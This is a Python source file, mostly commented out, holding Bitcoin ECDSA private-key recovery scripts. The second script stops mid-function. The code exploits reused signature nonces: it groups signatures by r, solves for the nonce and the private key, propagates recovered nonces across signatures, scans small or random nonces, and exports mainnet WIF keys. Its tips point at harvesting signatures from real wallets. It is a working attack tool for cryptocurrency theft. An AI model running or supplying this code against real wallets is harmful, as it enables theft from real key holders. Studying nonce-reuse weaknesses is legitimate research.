# #!/usr/bin/env python3
# # -*- coding: utf-8 -*-

# """
# recover_max.py — Maxed-out ECDSA duplicate-R recovery with propagation, WSH multisig pub-matching,
# caching, optional small-k scan, and optional HNP/Lattice hook.

# Usage examples:
#   python3 recover_stronger.py --sigs signatures.jsonl -v
#   python3 recover_stronger.py --sigs signatures.jsonl --rlist
#   python3 recover_stronger.py --sigs sigs_btc.jsonl --sigs sigs_bch.jsonl --export-clusters dupR_clusters.jsonl -v
#   python3 recover_stronger.py --sigs signatures.jsonl --rlist r_values.txt --scan-small-k 65535 --scan-small-k-top 300 -v
#   python3 recover_stronger.py --sigs signatures.jsonl --preload-k recovered_k.jsonl --append-k recovered_k.jsonl

# python3 recover_stronger.py \
#   --sigs signatures.jsonl \
#   --export-clusters dupR_clusters.jsonl \
#   --report-collisions r_collisions.jsonl \
#   --max-iter 6 \
#   --scan-small-k 65535 --scan-small-k-top 300 \
#   --preload-k recovered_k.jsonl

# Outputs:
#   recovered_keys.jsonl / recovered_keys.txt
#   recovered_k.jsonl   (r -> {k candidates})
#   r_collisions.jsonl  (optional)
#   dupR_clusters.jsonl (optional)
#   wsh_cache.json      (script_hex -> [pubs])  (auto)


# """
# from concurrent.futures import ThreadPoolExecutor, as_completed
# import threading
# import random as _rnd

# import argparse, json, sys, os, hashlib, base58, math
# from collections import defaultdict
# from itertools import combinations
# from typing import Dict, Any, List, Tuple, Set

# try:
#     from coincurve import PrivateKey, PublicKey
# except Exception as e:
#     print("[-] Missing dependency: coincurve (pip install coincurve)")
#     raise

# # ===== secp256k1 =====
# N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# def inv(x: int) -> int:
#     return pow(x, -1, N)

# def to_wif(d: int, compressed: bool = True, mainnet: bool = True) -> str:
#     prefix = b"\x80" if mainnet else b"\xEF"
#     payload = prefix + d.to_bytes(32, "big") + (b"\x01" if compressed else b"")
#     chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
#     return base58.b58encode(payload + chk).decode()

# def normalize_hex(s: str) -> str:
#     if s is None: return ""
#     s = s.strip().lower()
#     if s.startswith('"') and s.endswith('"'): s = s[1:-1]
#     if s.startswith("0x"): s = s[2:]
#     return s

# def hexint(s: str) -> int:
#     return int(normalize_hex(s) or "0", 16)

# def parse_der_sig_plus_type(sig_hex: str) -> Tuple[int,int,int]:
#     """Parse DER (optionally suffixed with sighash byte). Return (r,s,sighash_or_-1)."""
#     b = bytes.fromhex(sig_hex)
#     sighash = -1
#     blobs = [b, b[:-1]] if (len(b) >= 10 and b[0] == 0x30) else [b]
#     for blob in blobs:
#         try:
#             if len(blob) < 9 or blob[0] != 0x30: continue
#             i = 2
#             if blob[i] != 0x02: continue
#             lr = blob[i+1]; r = int.from_bytes(blob[i+2:i+2+lr], "big"); i += 2+lr
#             if blob[i] != 0x02: continue
#             ls = blob[i+1]; s = int.from_bytes(blob[i+2:i+2+ls], "big"); i += 2+ls
#             if blob is b[:-1]: sighash = b[-1]
#             return (r % N, s % N, sighash)
#         except Exception:
#             continue
#     raise ValueError("bad DER")

# def derive_pub_hex(d: int) -> Tuple[str, str]:
#     pk = PrivateKey(d.to_bytes(32, "big")).public_key
#     return pk.format(compressed=True).hex().lower(), pk.format(compressed=False).hex().lower()

# def r_from_k(k: int) -> int:
#     """Compute r = x((k*G)) mod n."""
#     if not (1 <= k < N): return 0
#     pub = PrivateKey(k.to_bytes(32, "big")).public_key.format(compressed=False)
#     # uncompressed: 0x04 | X(32) | Y(32)
#     if len(pub) != 65 or pub[0] != 0x04: return 0
#     x = int.from_bytes(pub[1:33], "big")
#     return x % N

# def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
#     """Check s == k^{-1}(z + r*d) mod n."""
#     if not (1 <= s < N and 1 <= r < N and 1 <= k < N and 1 <= d < N): return False
#     try:
#         lhs = (inv(k) * ((z + (r * d) % N) % N)) % N
#         return lhs == (s % N)
#     except Exception:
#         return False

# # ===== WSH script pub extraction cache =====
# CACHE_WSH = "wsh_cache.json"
# def load_wsh_cache() -> Dict[str, List[str]]:
#     if os.path.exists(CACHE_WSH):
#         try:
#             return json.load(open(CACHE_WSH, "r"))
#         except Exception:
#             pass
#     return {}

# def save_wsh_cache(cache: Dict[str, List[str]]):
#     try:
#         with open(CACHE_WSH, "w") as f: json.dump(cache, f)
#     except Exception:
#         pass

# def extract_pubs_from_script_hex(script_hex: str, cache: Dict[str, List[str]]) -> List[str]:
#     script_hex = normalize_hex(script_hex)
#     if not script_hex: return []
#     if script_hex in cache: return cache[script_hex]
#     pubs: List[str] = []
#     try:
#         b = bytes.fromhex(script_hex); i=0; L=len(b)
#         while i < L:
#             op = b[i]; i += 1
#             if op in (33, 65):  # direct push
#                 if i+op <= L:
#                     cand = b[i:i+op].hex().lower(); i += op
#                     if (op == 33 and (cand.startswith("02") or cand.startswith("03"))) or (op == 65 and cand.startswith("04")):
#                         pubs.append(cand)
#                 else:
#                     break
#             elif op == 0x4c and i < L:
#                 ln = b[i]; i += 1
#                 if i+ln > L: break
#                 blob = b[i:i+ln]; i += ln
#                 if ln in (33,65):
#                     cand = blob.hex().lower()
#                     if (ln==33 and (cand.startswith("02") or cand.startswith("03"))) or (ln==65 and cand.startswith("04")):
#                         pubs.append(cand)
#             elif op == 0x4d and i+2 <= L:
#                 ln = int.from_bytes(b[i:i+2],"little"); i += 2
#                 if i+ln > L: break
#                 blob = b[i:i+ln]; i += ln
#                 if ln in (33,65):
#                     cand = blob.hex().lower()
#                     if (ln==33 and (cand.startswith("02") or cand.startswith("03"))) or (ln==65 and cand.startswith("04")):
#                         pubs.append(cand)
#             elif op == 0x4e and i+4 <= L:
#                 ln = int.from_bytes(b[i:i+4],"little"); i += 4
#                 if i+ln > L: break
#                 blob = b[i:i+ln]; i += ln
#                 if ln in (33,65):
#                     cand = blob.hex().lower()
#                     if (ln==33 and (cand.startswith("02") or cand.startswith("03"))) or (ln==65 and cand.startswith("04")):
#                         pubs.append(cand)
#             else:
#                 # other opcodes; skip
#                 pass
#     except Exception:
#         pubs = []
#     pubs = list(dict.fromkeys(pubs))  # de-dup preserve order
#     cache[script_hex] = pubs
#     return pubs

# # ===== Loaders =====
# def load_rlist(path: str) -> Set[int]:
#     rset: Set[int] = set()
#     if not path: return rset
#     if not os.path.exists(path):
#         print(f"[warn] rlist not found: {path} (skipping)")
#         return rset
#     for line in open(path, "r", encoding="utf-8"):
#         s = normalize_hex(line.strip())
#         if not s: continue
#         try: rset.add(int(s,16))
#         except Exception: pass
#     return rset

# def parse_row_to_sigrec(j: Dict[str, Any], wsh_cache: Dict[str, List[str]], rfilter: Set[int]) -> Dict[str, Any] | None:
#     """
#     Normalize one JSON obj into internal sig-record:
#     { txid, vin, r,s,z, pubs:[..], rhex, shex, zhex, info:{...} }
#     Accepts:
#       - r/s/z hex fields (preferred)
#       - or signature_hex for r/s extraction
#       - pubkey_hex / pub / pubkey
#       - witness_script / redeem_script (for multisig pub candidates)
#     """
#     txid = (j.get("txid") or "").strip()
#     try: vin = int(j.get("vin", 0))
#     except Exception: vin = 0

#     # r/s/z
#     r_val = None; s_val = None
#     if "r" in j and "s" in j:
#         try:
#             r_val = hexint(j["r"]); s_val = hexint(j["s"])
#         except Exception:
#             r_val = s_val = None
#     if (r_val is None or s_val is None) and j.get("signature_hex"):
#         try:
#             rr, ss, _ = parse_der_sig_plus_type(normalize_hex(j["signature_hex"]))
#             r_val, s_val = rr, ss
#         except Exception:
#             pass
#     if r_val is None or s_val is None:
#         return None

#     if rfilter and (r_val not in rfilter):
#         return None

#     if "z" not in j:  # we require z for offline math
#         return None
#     try:
#         z_val = hexint(j["z"])
#     except Exception:
#         return None

#     # collect pub candidates
#     pubs: List[str] = []
#     single_pub = normalize_hex(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey"))
#     if single_pub:
#         pubs.append(single_pub)

#     # multisig scripts
#     for key in ("witness_script", "redeem_script", "script_code", "ws_hex"):
#         if key in j and j[key]:
#             pubs += extract_pubs_from_script_hex(j[key], wsh_cache)

#     if not pubs:
#         # last resort: maybe 'pub' field under different name (already tried)
#         pass

#     pubs = [p for p in pubs if p and (len(p) in (66,130))]  # 33/65 bytes hex
#     pubs = list(dict.fromkeys(pubs))  # de-dup preserve order

#     if not pubs:
#         # If we truly have no pub candidate, we still keep record; later propagation can find d then derive pub
#         pass

#     rec = {
#         "txid": txid, "vin": vin,
#         "r": r_val, "s": s_val, "z": z_val,
#         "rhex": f"{r_val:064x}", "shex": f"{s_val:064x}", "zhex": f"{z_val:064x}",
#         "pubs": pubs,
#         "info": {
#             "type": j.get("type"),
#             "address": j.get("address"),
#             "prev_spk": j.get("prev_spk") or j.get("prev_scriptPubKey"),
#             "prev_value": j.get("prev_value") or j.get("prev_amount"),
#         }
#     }
#     return rec

# def load_signatures_multi(paths: List[str], rfilter: Set[int], verbose=False) -> List[Dict[str,Any]]:
#     wsh_cache = load_wsh_cache()
#     rows: List[Dict[str,Any]] = []
#     total_raw = 0
#     for path in paths:
#         if not os.path.exists(path):
#             print(f"[warn] signatures file not found: {path}")
#             continue
#         data = open(path, "r", encoding="utf-8").read()
#         data = data.strip()
#         if data.startswith('"') and data.endswith('"') and "\n" not in data:
#             data = data[1:-1]
#         first = next((c for c in data if not c.isspace()), "")
#         if first == "[":
#             try:
#                 arr = json.loads(data)
#                 if isinstance(arr, list):
#                     for j in arr:
#                         if isinstance(j, dict):
#                             total_raw += 1
#                             rec = parse_row_to_sigrec(j, wsh_cache, rfilter)
#                             if rec: rows.append(rec)
#             except Exception as e:
#                 print(f"[error] failed to parse JSON array from {path}: {e}")
#         else:
#             for line in data.splitlines():
#                 line=line.strip()
#                 if not line: continue
#                 if line.startswith('"') and line.endswith('"'): line=line[1:-1]
#                 try:
#                     j = json.loads(line)
#                 except Exception:
#                     continue
#                 if not isinstance(j, dict): continue
#                 total_raw += 1
#                 rec = parse_row_to_sigrec(j, wsh_cache, rfilter)
#                 if rec: rows.append(rec)

#     # save cache back
#     save_wsh_cache(load_wsh_cache() | {})  # ensure file exists
#     if verbose:
#         print(f"[info] loaded {len(rows)} usable sigs out of ~{total_raw} raw rows from {len(paths)} file(s)")
#     return rows

# # ===== Bucketing / reports =====
# def bucket_by_r(rows: List[Dict[str,Any]]):
#     m = defaultdict(list)
#     for rec in rows: m[rec["r"]].append(rec)
#     return m

# def report_collisions(rows: List[Dict[str,Any]], path: str):
#     """Same r used across ≥2 distinct pubs (based on candidates observed)."""
#     per_r = defaultdict(lambda: defaultdict(int))
#     for rec in rows:
#         seen = set(rec["pubs"]) if rec["pubs"] else set()
#         if not seen:
#             # unknown pub yet: tag as 'unknown'
#             per_r[rec["r"]]["<unknown>"] += 1
#         else:
#             for p in seen:
#                 per_r[rec["r"]][p] += 1
#     out = 0
#     with open(path, "w", encoding="utf-8") as f:
#         for r_val, mp in per_r.items():
#             if len(mp) <= 1: continue
#             obj = {
#                 "r": f"{r_val:064x}",
#                 "pub_counts": mp,
#                 "distinct_pubs": len(mp)
#             }
#             f.write(json.dumps(obj) + "\n"); out += 1
#     return out

# def export_dupR_clusters(rows: List[Dict[str,Any]], path: str, min_count: int):
#     """Export (r, pub_guess) clusters where we have ≥2 records sharing r and a same single-pub guess."""
#     # If multiple pubs per rec, we conservatively pick the first candidate as a "guess"
#     g = defaultdict(list)  # (r, pub_guess) -> list
#     for rec in rows:
#         pub_guess = rec["pubs"][0] if rec["pubs"] else "<unknown>"
#         g[(rec["r"], pub_guess)].append(rec)
#     out = 0
#     with open(path, "w", encoding="utf-8") as f:
#         for (r_val, pub), lst in g.items():
#             if len(lst) < min_count: continue
#             f.write(json.dumps({
#                 "r": f"{r_val:064x}",
#                 "pubkey": pub,
#                 "count": len(lst),
#                 "sightings": [{"txid": x["txid"], "vin": x["vin"]} for x in lst]
#             }) + "\n")
#             out += 1
#     return out

# # ===== Recovery core =====
# def recover_from_pair_generic(r: int, A: Dict[str,Any], B: Dict[str,Any]) -> List[Tuple[int,int,str]]:
#     """Return list of candidates (d,k,why) from two sigs that share the same r."""
#     s1, s2, z1, z2 = A["s"], B["s"], A["z"], B["z"]
#     cands = []
#     # (1) denom = s1 - s2
#     denom = (s1 - s2) % N
#     if denom != 0:
#         k = ((z1 - z2) * inv(denom)) % N
#         d = ((s1 * k - z1) * inv(r)) % N
#         if 1 <= d < N and 1 <= k < N:
#             cands.append((d, k, "diff"))
#     # (2) denom2 = s1 + s2    (handles s ↔ N-s malleation)
#     denom2 = (s1 + s2) % N
#     if denom2 != 0:
#         k2 = ((z1 + z2) * inv(denom2)) % N
#         d2 = ((s1 * k2 - z1) * inv(r)) % N
#         if 1 <= d2 < N and 1 <= k2 < N:
#             cands.append((d2, k2, "sum"))
#     return cands

# def add_k_candidate(r: int, k: int, store: Dict[int, Set[int]]):
#     if k and 0 < k < N:
#         store.setdefault(r, set()).add(k)
#         store[r].add((N - k) % N)  # sign flip complement

# def best_pub_match(d: int, pubs: List[str]) -> str | None:
#     """Return the matching pub from candidate list (compressed/uncompressed)."""
#     try:
#         pk_c, pk_u = derive_pub_hex(d)
#     except Exception:
#         return None
#     if pubs:
#         if pk_c in pubs: return pk_c
#         if pk_u in pubs: return pk_u
#         # Some datasets only list one form; consider equivalence by recompressing:
#         if any(p.startswith("04") and len(p)==130 for p in pubs) and pk_u.startswith("04"): return pk_u
#         if any((p.startswith("02") or p.startswith("03")) and len(p)==66 for p in pubs) and (pk_c.startswith("02") or pk_c.startswith("03")): return pk_c
#         return None
#     # if no candidate list, accept compressed as canonical
#     return pk_c

# def preload_k(path: str) -> Dict[int, Set[int]]:
#     """Load previously saved r->k candidates (from recovered_k.jsonl)."""
#     m: Dict[int, Set[int]] = defaultdict(set)
#     if not path or not os.path.exists(path): return m
#     for line in open(path, "r", encoding="utf-8"):
#         line=line.strip()
#         if not line: continue
#         try:
#             j = json.loads(line)
#         except Exception:
#             continue
#         r = hexint(j.get("r",""))
#         ks = [hexint(x) for x in j.get("k_candidates", [])]
#         for k in ks: add_k_candidate(r, k, m)
#     return m

# def append_k(path: str, r2k: Dict[int, Set[int]]):
#     if not path: return
#     with open(path, "a", encoding="utf-8") as f:
#         for r_val, kset in r2k.items():
#             if not kset: continue
#             f.write(json.dumps({
#                 "r": f"{r_val:064x}",
#                 "k_candidates": [f"{k:064x}" for k in sorted(kset)]
#             }) + "\n")

# def small_k_scan(rmap, limit_buckets:int, B:int, recovered_priv_by_pub:Dict[str,int], recovered, testnet, verbose):
#     """Try k in [1..B] per r (top buckets by size). Requires knowing candidate pubs per sig to accept."""
#     buckets = sorted(rmap.items(), key=lambda kv: len(kv[1]), reverse=True)
#     if limit_buckets > 0: buckets = buckets[:limit_buckets]
#     hits = 0
#     for r_val, sigs in buckets:
#         # Quick prefilter: if no sig has pubs, scanning is less meaningful — still try (we can match against derived pub later?)
#         for k in range(1, B+1):
#             try:
#                 if r_from_k(k) != (r_val % N): continue
#             except Exception:
#                 continue
#             for sig in sigs:
#                 try:
#                     d = ((sig["s"] * k - sig["z"]) * inv(r_val)) % N
#                     if not (1 <= d < N): continue
#                     if not ecdsa_ok(sig["s"], sig["z"], r_val, d, k): continue
#                     match = best_pub_match(d, sig["pubs"])
#                     if not match: continue
#                     if recovered_priv_by_pub.get(match) == d: continue
#                     recovered_priv_by_pub[match] = d
#                     wif = to_wif(d, compressed=True, mainnet=not testnet)
#                     recovered.append({
#                         "pubkey": match,
#                         "priv_hex": f"{d:064x}",
#                         "wif": wif,
#                         "r": f"{r_val:064x}",
#                         "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
#                         "method": f"small-k-{B}"
#                     })
#                     if verbose:
#                         print(f"[small-k] r={r_val:064x} k={k} -> pub={match} d={d:064x}")
#                     hits += 1
#                 except Exception:
#                     continue
#     return hits

# def main():
#     ap = argparse.ArgumentParser(description="Max ECDSA recovery with propagation, WSH multisig pub-matching and caching.")
#     ap.add_argument("--threads", type=int, default=1, help="worker თრედების რაოდენობა (random-k სკანზე/ბუკეტებზე)")
#     ap.add_argument("--scan-random-k", type=int, default=0, help="თუ >0, თითო არჩეულ r-ბუკეტზე სცადე ამდენი შემთხვევითი k")
#     ap.add_argument("--scan-random-k-top", type=int, default=50, help="ყველაზე \"ცხელი\" r-ბუკეტებიდან რამდენზე გავუშვათ შემთხვევითი k-სკანი (0=ყველაზე)")
#     ap.add_argument("--scan-random-k-range", type=int, default=(1<<32), help="კანდიდატ k იხატება დიაპაზონიდან [1..range] (mod n)")
#     ap.add_argument("--rand-seed", type=int, default=0, help="seed შემთხვევითი k-ებისთვის (0=ენტროპია)")

#     ap.add_argument("--sigs", action="append", default=[], help="signatures file (JSONL or JSON array). Repeatable.")
#     ap.add_argument("--rlist", default="r_values.txt", help="optional r filter list (one hex per line)")
#     ap.add_argument("--out-json", default="recovered_keys.jsonl", help="output JSONL recoveries")
#     ap.add_argument("--out-txt",  default="recovered_keys.txt", help="output TXT recoveries")
#     ap.add_argument("--out-k",    default="recovered_k.jsonl", help="output JSONL r->k candidates (overwrite)")
#     ap.add_argument("--append-k", default="", help="append r->k candidates also to this file (use to accumulate across runs)")
#     ap.add_argument("--preload-k", default="", help="preload r->k candidates from previous recovered_k.jsonl")
#     ap.add_argument("--export-clusters", default="", help="write dupR_clusters.jsonl (>=2 per (r,pub_guess))")
#     ap.add_argument("--report-collisions", default="", help="write r_collisions.jsonl (same r across ≥2 pubs)")
#     ap.add_argument("--min-count", type=int, default=2, help="min signatures per r for pairwise attempts (per r bucket)")
#     ap.add_argument("--max-iter", type=int, default=5, help="max propagation iterations")
#     ap.add_argument("--testnet", action="store_true", help="testnet WIF instead of mainnet")
#     ap.add_argument("--resign-check", action="store_true", default=True, help="verify s=k^{-1}(z+r·d) on all proofs")
#     ap.add_argument("--scan-small-k", type=int, default=0, help="try k in [1..B] for top r-buckets (heavy; optional)")
#     ap.add_argument("--scan-small-k-top", type=int, default=200, help="how many top r-buckets to small-k scan")
#     ap.add_argument("--hnp", action="store_true", help="attempt HNP/Lattice if fpylll available (advanced; optional)")
#     ap.add_argument("-v", "--verbose", action="store_true")
#     args = ap.parse_args()

#     if not args.sigs:
#         print("Provide at least one --sigs file.")
#         sys.exit(1)

#     rset = load_rlist(args.rlist)
#     rows = load_signatures_multi(args.sigs, rset, verbose=args.verbose)
#     if not rows:
#         print("No usable signatures found (need r,s,z and ideally pub(s)).")
#         sys.exit(1)

#     if args.export_clusters:
#         cnt = export_dupR_clusters(rows, args.export_clusters, args.min_count)
#         if args.verbose: print(f"[info] wrote {cnt} dupR clusters to {args.export_clusters}")

#     if args.report_collisions:
#         cc = report_collisions(rows, args.report_collisions)
#         if args.verbose: print(f"[info] wrote {cc} r-collision records to {args.report_collisions}")

#     rmap = bucket_by_r(rows)
#     recovered: List[Dict[str,Any]] = []
#     recovered_priv_by_pub: Dict[str,int] = {}
#     seen_privs: Set[int] = set()

#     # preload r->k
#     recovered_k_by_r: Dict[int, Set[int]] = preload_k(args.preload_k)

#     # Phase A: per-r pairwise attempts (works for single or multi-pub by validating match)
#     for r_val, lst in rmap.items():
#         if len(lst) < args.min_count:
#             if args.verbose:
#                 print(f"[-] r={r_val:064x} skipped (count={len(lst)})")
#             continue
#         if args.verbose:
#             print(f"[r-bucket {r_val:064x}] pairs={len(lst)*(len(lst)-1)//2}")
#         for A, B in combinations(lst, 2):
#             for d, k, why in recover_from_pair_generic(r_val, A, B):
#                 # verify both sigs & match a candidate pub in BOTH
#                 if not (ecdsa_ok(A["s"], A["z"], r_val, d, k) and ecdsa_ok(B["s"], B["z"], r_val, d, k)):
#                     continue
#                 matchA = best_pub_match(d, A["pubs"])
#                 matchB = best_pub_match(d, B["pubs"])
#                 if matchA is None or matchB is None:
#                     # If no pubs provided at all, we can still accept based on math; pick compressed as canonical
#                     matchA = matchA or derive_pub_hex(d)[0]
#                     matchB = matchB or matchA
#                 # record only once per d
#                 if d in seen_privs: 
#                     # still add k
#                     add_k_candidate(r_val, k, recovered_k_by_r)
#                     continue
#                 seen_privs.add(d)
#                 # add k for this r
#                 add_k_candidate(r_val, k, recovered_k_by_r)
#                 # map under both matched pubs
#                 recovered_priv_by_pub[matchA] = d
#                 recovered_priv_by_pub[matchB] = d
#                 wif = to_wif(d, compressed=True, mainnet=not args.testnet)
#                 rec = {
#                     "pubkey": matchA,
#                     "priv_hex": f"{d:064x}",
#                     "wif": wif,
#                     "r": f"{r_val:064x}",
#                     "proof": [
#                         {"txid": A["txid"], "vin": A["vin"]},
#                         {"txid": B["txid"], "vin": B["vin"]}
#                     ],
#                     "method": f"primary-{why}"
#                 }
#                 if args.resign_check:
#                     okA = ecdsa_ok(A["s"], A["z"], r_val, d, k)
#                     okB = ecdsa_ok(B["s"], B["z"], r_val, d, k)
#                     if not (okA and okB): 
#                         continue
#                 recovered.append(rec)
#                 if args.verbose:
#                     print("="*62)
#                     print(f"[RECOVERED] pub≈{matchA[:16]}… d={rec['priv_hex']} r={rec['r']} ({rec['method']})")
#                     print("="*62)

#     # Phase B: Iterative k-expansion from recovered privs + propagation over r-buckets
#     def expand_k_from_privs() -> int:
#         added = 0
#         # build index of all sigs (by pub candidate)
#         sigs_for_pub = defaultdict(list)
#         for rec in rows:
#             for p in rec["pubs"]:
#                 sigs_for_pub[p].append(rec)
#         for pub, d in list(recovered_priv_by_pub.items()):
#             # this pub may appear in compressed/uncompressed forms across records
#             pk_c, pk_u = derive_pub_hex(d)
#             for p in (pk_c, pk_u):
#                 for sig in sigs_for_pub.get(p, []):
#                     r_val = sig["r"]
#                     try:
#                         k = ((sig["z"] + (r_val * d) % N) % N) * inv(sig["s"]) % N
#                     except Exception:
#                         continue
#                     before = len(recovered_k_by_r[r_val])
#                     add_k_candidate(r_val, k, recovered_k_by_r)
#                     after = len(recovered_k_by_r[r_val])
#                     added += (after - before)
#         return added

#     def propagate_with_known_k() -> int:
#         new_count = 0
#         for r_val, kset in list(recovered_k_by_r.items()):
#             if not kset: continue
#             bucket = rmap.get(r_val, [])
#             if args.verbose:
#                 print(f"[propagate r={r_val:064x}] k-candidates={len(kset)} sigs={len(bucket)}")
#             for sig in bucket:
#                 for k in list(kset):
#                     try:
#                         d = ((sig["s"] * k - sig["z"]) * inv(r_val)) % N
#                         if not (1 <= d < N): continue
#                         if not ecdsa_ok(sig["s"], sig["z"], r_val, d, k): continue
#                         match = best_pub_match(d, sig["pubs"])
#                         if match is None: match = derive_pub_hex(d)[0]
#                     except Exception:
#                         continue
#                     # already have this pub?
#                     if recovered_priv_by_pub.get(match) == d: 
#                         continue
#                     recovered_priv_by_pub[match] = d
#                     wif = to_wif(d, compressed=True, mainnet=not args.testnet)
#                     rec = {
#                         "pubkey": match,
#                         "priv_hex": f"{d:064x}",
#                         "wif": wif,
#                         "r": f"{r_val:064x}",
#                         "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
#                         "method": "propagate-from-r"
#                     }
#                     recovered.append(rec)
#                     if args.verbose:
#                         print(f"[RECOVERED via propagation] pub={match[:16]}… d={rec['priv_hex']} r={rec['r']}")
#                     new_count += 1
#         return new_count

#     iter_no = 0
#     while iter_no < args.max_iter:
#         iter_no += 1
#         grew_k = expand_k_from_privs()
#         grew_keys = propagate_with_known_k()
#         if args.verbose:
#             print(f"[iter {iter_no}] grew_k={grew_k}, grew_keys={grew_keys}")
#         if grew_k == 0 and grew_keys == 0:
#             break

#     # Optional small-k scan (tactical)
#     if args.scan_small_k and args.scan_small_k > 0:
#         found = small_k_scan(rmap, args.scan_small_k_top, args.scan_small_k,
#                              recovered_priv_by_pub, recovered, args.testnet, args.verbose)
#         if args.verbose:
#             print(f"[small-k] total new keys: {found}")

#     # Optional HNP/Lattice hook (advanced; requires fpylll)
#     if args.hnp:
#         try:
#             import fpylll  # noqa: F401
#             # Placeholder: full HNP implementation depends on RNG-bias modeling; out-of-scope for a single file.
#             # Here you could gather many (r,s,z) for the *same* pub, build lattice and run LLL/BKZ.
#             print("[hnp] fpylll present. HNP/Lattice module is a stub in this file — supply bias model & call solver.")
#         except Exception:
#             print("[hnp] fpylll not installed; skipping HNP stage.")

#     # Save outputs
#     if recovered:
#         with open(args.out_json, "w", encoding="utf-8") as f:
#             for rec in recovered:
#                 f.write(json.dumps(rec) + "\n")
#         with open(args.out_txt, "w", encoding="utf-8") as f:
#             for rec in recovered:
#                 if rec["method"].startswith("primary"):
#                     via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} & {rec['proof'][1]['txid']}:{rec['proof'][1]['vin']}"
#                 else:
#                     via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']}"
#                 f.write(f"PUB={rec['pubkey']} PRIV={rec['priv_hex']} WIF={rec['wif']} R={rec['r']} via {via} ({rec['method']})\n")
#         # overwrite main k-dump
#         with open(args.out_k, "w", encoding="utf-8") as f:
#             for r_val, kset in recovered_k_by_r.items():
#                 if not kset: continue
#                 f.write(json.dumps({
#                     "r": f"{r_val:064x}",
#                     "k_candidates": [f"{k:064x}" for k in sorted(kset)]
#                 }) + "\n")
#         # optionally append to cumulative k-store
#         if args.append_k:
#             append_k(args.append_k, recovered_k_by_r)

#         print(f"\nSaved {len(recovered)} recovery record(s) to:")
#         print(f"  {args.out_json}")
#         print(f"  {args.out_txt}")
#         print(f"Saved recovered k candidates per r to: {args.out_k}")
#         if args.append_k:
#             print(f"Also appended k candidates to: {args.append_k}")
#     else:
#         print("No keys recovered. Tips:")
#         print("  • Make sure z is correct (prevout script/amount right).")
#         print("  • Feed more signatures from the same wallet / across forks.")
#         print("  • Enable small-k scan on suspicious ranges (old wallets).")
#         print("  • Ensure multisig witness/redeem scripts are included for WSH.")

# if __name__ == "__main__":
#     main()





# /////////////////// Random Mode /////////////////////////////////////

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
recover_stronger.py

Stronger ECDSA recovery from duplicate-R signatures with iterative propagation
and random-k scanning (threaded).

Inputs:
  - signatures.jsonl (JSON lines) or signatures.json (array)
    Required fields per row:
      - pubkey_hex|pub|pubkey  (33/65-byte hex)
      - z (hex, already-computed sighash preimage digest mod n)
    Optional:
      - r/s (hex); if missing, signature_hex will be parsed to extract r/s

Outputs:
  - recovered_keys.jsonl / recovered_keys.txt
  - recovered_k.jsonl  (r -> k candidates)
  - dupR_clusters.jsonl  (optional export)
  - r_collisions.jsonl   (optional export)

Flags of interest:
  --threads N                     : worker threads for random-k scan
  --scan-random-k K               : try K random k per hot r-bucket (0 to disable)
  --scan-random-k-top T           : scan only top-T hottest r-buckets (0=all)
  --scan-random-k-range R         : draw k ∈ [1..R] (mod n cap)
  --rand-seed S                   : seed for reproducibility (0 = system entropy)
  --preload-k recovered_k.jsonl   : preload known k candidates per r

  --max-iter I                    : propagation iterations after primary recovery
  --min-count C                   : min signatures per (pub,r) cluster for primary
  --rlist r_values.txt            : optional r-filter
  --pub <hex>                     : optional pubkey filter (exact 33/65 hex)
"""

import argparse, json, sys, os, hashlib, base58, random
from collections import defaultdict
from itertools import combinations
from typing import Dict, Any, List, Tuple, Set

from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

from coincurve import PrivateKey  # pip install coincurve

# ===== secp256k1 =====
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def inv(x: int) -> int: return pow(x, -1, N)

def to_wif(d: int, compressed: bool = True, mainnet: bool = True) -> str:
    prefix = b"\x80" if mainnet else b"\xEF"
    payload = prefix + d.to_bytes(32, "big") + (b"\x01" if compressed else b"")
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + chk).decode()

def hexint(s: str) -> int:
    s = (s or "").strip().lower()
    if s.startswith('"') and s.endswith('"'): s = s[1:-1]
    if s.startswith("0x"): s = s[2:]
    return int(s, 16)

def normalize_pub(pub_hex: str) -> str:
    s = (pub_hex or "").strip().lower()
    if s.startswith('"') and s.endswith('"'): s = s[1:-1]
    return s

def parse_der_sig_plus_type(sig_hex: str) -> Tuple[int,int,int]:
    """
    Parse DER signature optionally suffixed with sighash byte.
    Returns (r, s, sighash) where sighash may be -1 if absent.
    Robust enough for common wallet encodings.
    """
    b = bytes.fromhex(sig_hex)
    sighash = -1
    # Try both with and without trailing sighash byte
    candidates = [b]
    if len(b) >= 9 and b[0] == 0x30:
        candidates = [b, b[:-1]] if len(b) >= 10 else [b]
    for blob in candidates:
        try:
            if len(blob) < 9 or blob[0] != 0x30: continue
            i = 2
            if blob[i] != 0x02: continue
            lr = blob[i+1]; r = int.from_bytes(blob[i+2:i+2+lr], "big"); i += 2+lr
            if blob[i] != 0x02: continue
            ls = blob[i+1]; s = int.from_bytes(blob[i+2:i+2+ls], "big"); i += 2+ls
            if blob is b[:-1]: sighash = b[-1]
            return r % N, s % N, sighash
        except Exception:
            continue
    raise ValueError("Bad DER signature")

def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
    # s ≡ k^{-1}(z + r·d) (mod n)
    if not (1 <= s < N and 1 <= r < N and 1 <= k < N and 1 <= d < N):
        return False
    try:
        return (inv(k) * ((z + (r * d) % N) % N)) % N == (s % N)
    except ValueError:
        return False

def derive_pub_hex(d: int) -> Tuple[str, str]:
    pk = PrivateKey(d.to_bytes(32, "big")).public_key
    return pk.format(compressed=True).hex().lower(), pk.format(compressed=False).hex().lower()

def _pub_matches(d: int, target_pub: str) -> bool:
    try:
        pk_c, pk_u = derive_pub_hex(d)
        return target_pub in (pk_c, pk_u)
    except Exception:
        return False

def _derive_d_from_k_sig(r_val: int, s: int, z: int, k: int) -> int:
    # d ≡ (s·k - z) / r (mod n)
